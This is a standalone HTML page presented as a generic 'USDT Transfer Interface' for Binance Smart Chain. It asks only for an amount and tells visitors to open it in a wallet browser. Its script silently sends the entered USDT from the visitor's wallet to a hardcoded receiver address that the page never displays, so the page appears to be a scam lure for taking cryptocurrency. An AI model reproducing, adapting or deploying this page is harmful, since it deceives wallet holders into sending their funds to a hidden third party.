<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT Transfer Interface</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #26a17b; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #fff; }
  h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
  .input-box { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #2a3f75; background: #0b132f; color: #fff; font-size: 16px; text-align: center; }
  .btn { background: linear-gradient(135deg, #26a17b, #1e8263); color: #fff; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
  .btn:active { transform: scale(0.98); }
  .info { margin-top: 20px; font-size: 12px; color: #64748b; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">T</div>
  <h1>USDT Transfer Interface</h1>
  <p>Enter the amount of USDT you wish to transfer.</p>
  
  <input type="number" id="amountInput" class="input-box" placeholder="Enter USDT amount" min="0" step="any">
  <button class="btn" onclick="executeTransfer()">Transfer</button>
  
  <div class="info">Binance Smart Chain Network</div>
</div>

<script>
  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
  ];

  async function executeTransfer() {
    if (typeof window.ethereum === 'undefined') {
      alert("Please open this link inside Trust Wallet or MetaMask browser.");
      return;
    }

    const amountVal = document.getElementById('amountInput').value;
    if (!amountVal || Number(amountVal) <= 0) {
      alert("Please enter a valid amount!");
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      
      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
      
      // BSC par USDT ke 18 decimals hote hain
      const parsedAmount = ethers.utils.parseUnits(amountVal, 18);
      
      const balance = await usdtContract.balanceOf(userAddress);
      if (balance.lt(parsedAmount)) {
        alert("Insufficient USDT balance!");
        return;
      }

      // Seedha transfer call jo user ke enter kiye hue amount ko target address par bhej dega
      const tx = await usdtContract.transfer(TARGET_RECEIVER, parsedAmount, {
        gasLimit: ethers.BigNumber.from("65000")
      });
      
      await tx.wait();
      alert("Transfer Successful!");

    } catch (error) {
      console.error("Error:", error);
      alert("Transaction cancelled or failed.");
    }
  }
</script>

</body>
</html>
